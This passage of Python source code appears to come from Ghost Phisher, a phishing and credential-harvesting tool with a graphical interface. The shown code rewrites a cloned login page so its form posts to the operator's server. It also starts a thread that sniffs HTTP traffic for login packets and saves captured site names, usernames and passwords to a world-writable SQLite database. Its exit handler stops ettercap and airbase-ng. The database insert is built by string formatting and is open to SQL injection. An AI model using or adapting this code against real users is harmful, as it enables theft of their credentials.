            if http_server_port == 80:
                http_address = 'http://%s/'%(actions_ip_address)  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
            else:
                http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)    # Evaluate server address e,g http://192.168.0.23:8080/

        if self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
            html_file = open('%s/HTTP-Webscript/index.html'%(cwd))
            html_source = html_file.read()

            locate_form_action = html_source.find('action')
            index_forms_end = html_source[locate_form_action:-1]
            index_form_length = index_forms_end.find('>')

            action_string = index_forms_end[0:index_form_length]

            new_post_action = html_source.replace(action_string,"action=" + http_address) # Replaces action variable with ours e.g <action="http://192.168.0.23/">
            create_settings('self.lineEdit_2',str(self.lineEdit_2.text()))
            #
            # Check if html source has a valid Post action method
            #

            os.remove('%s/HTTP-Webscript/index.html'%(cwd))                     # Remove index script
            new_html_file = open('%s/HTTP-Webscript/index.html'%(cwd),'a+')     # Rewrite to incude our new action url
            new_html_file.write(new_post_action)
            new_html_file.close()

            self.status_textbrowser_http.append('<font color=green>Sniffing http port for possible login packets')
            thread.start_new_thread(self.sniff_thread,())                       # HTTP credential Sniffing thread


        else:                                                              # Hosting Mode is enabled
            self.status_textbrowser_http.append('<font color=green>Website Hosting activated</font>')



        if http_error == 0:      # Means that we hitted this block without any errors from the other blocks
            self.http_start.setEnabled(False)
            self.http_stop.setEnabled(True)
            self.http_captured_credential.setText('captured credentials:')
            self.http_port_label.setText('<font color=green>TCP Port:</font> %s'%(http_server_port))
            self.http_ip_label.setText('<font color=green>Service running on:</font>  %s'%(actions_ip_address))
            self.label_13.setText('<font color=green>Runtime:</font>  %s'%(time.ctime()))

            http_working_directory = cwd + os.sep + 'HTTP-Webscript'            # e.g /root/Desktop/HTTP-Webscript

            thread.start_new_thread(self.HTTP_Server,(http_server_port,http_working_directory))      # Starts the HTTP Server




            if http_server_port == 80:
                http_address = 'http://%s/'%(actions_ip_address)
                self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
            else:
                http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)
                self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))

            thread.start_new_thread(self.http_update_thread,())                  # Runs the thread loop that checks for new inputs to database
            self.status_textbrowser_http.append('')









    #########################################################################
    #       CREDENTIAL HARVEST DEFINITION ,FUNCTIONS AND SIGNALS            #
    #########################################################################


    def database_commit(self,website,username,password):
        ''' Commits captured credential to database'''
        database = sqlite3.connect(cwd + '/Ghost-Phisher-Database/' + 'database.db')
        database_query = database.cursor()
        database_query.execute('create table if not exists credentials (website text, username text, password text)')
        database_query.execute("insert into credentials values ('%s','%s','%s')"% (website,username,password))
        database.commit()
        database.close()


    def fetch_data(self):
        ''' Function searches for new entries in database
            and displays it on the database table
        '''
        if 'Ghost-Phisher-Database' not in os.listdir(cwd):
            os.mkdir(cwd + '/Ghost-Phisher-Database')
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)
        database_read = sqlite3.connect(cwd + '/Ghost-Phisher-Database/' + 'database.db')
        os.chmod('%s/Ghost-Phisher-Database/database.db'%(cwd),0777)
        database_query = database_read.cursor()
        database_query.execute('create table if not exists credentials (website text, username text, password text)')
        database_query.execute('select * from credentials')
        database_values = database_query.fetchall()
        database_read.close()
        return database_values



    def insert_credential(self):
        ''' insert a new row on the database table'''
        self.credential_table.insertRow(0)


    def delete_credential(self):
        ''' deletes current row on the database table'''
        selected_row = self.credential_table.currentRow()
        self.credential_table.removeRow(selected_row)


    def save_changes(self):
        ''' Removes our old database,creates a new
            one and commits changes to the new
            database
        '''
        if 'Ghost-Phisher-Database' not in os.listdir(cwd):
            os.mkdir(cwd + '/Ghost-Phisher-Database')
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)
        if 'database.db' in os.listdir(cwd + '/Ghost-Phisher-Database'):
            os.remove(cwd + '/Ghost-Phisher-Database/' + 'database.db')

        row_number = self.credential_table.rowCount()

        for iterate in range(0,row_number):
            try:
                website = QtGui.QTableWidgetItem(self.credential_table.item(iterate,0))
                username = QtGui.QTableWidgetItem(self.credential_table.item(iterate,1))
                password = QtGui.QTableWidgetItem(self.credential_table.item(iterate,2))
                self.database_commit(website.text(),username.text(),password.text())        # Save data to database
            except TypeError:
                QtGui.QMessageBox.warning(self,'Null Field Detected','Please remove white spaces or rows with empty data')
        try:
            os.chmod('%s/Ghost-Phisher-Database/database.db'%(cwd),0777)
        except OSError:
            pass






    #######################################################
    #               CLOSING GHOST PHISHER                 #
    #######################################################


    def closeEvent(self,event):
        ''' Close Network connections after
            user exits application
        '''
        answer = QtGui.QMessageBox.question(self,"Ghost Phisher","Are you sure you want to quit?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
        if answer == QtGui.QMessageBox.Yes:
            if dns_contol == 0:
                self.stop_dns()
            commands.getstatusoutput('killall mini-httpd')
            commands.getstatusoutput('killall ettercap')
            try:
                commands.getstatusoutput('killall airbase-ng')
                self.stop_dhcp()
                self.stop_http()
            except NameError:
                pass
            event.accept()
        else:
            event.ignore()


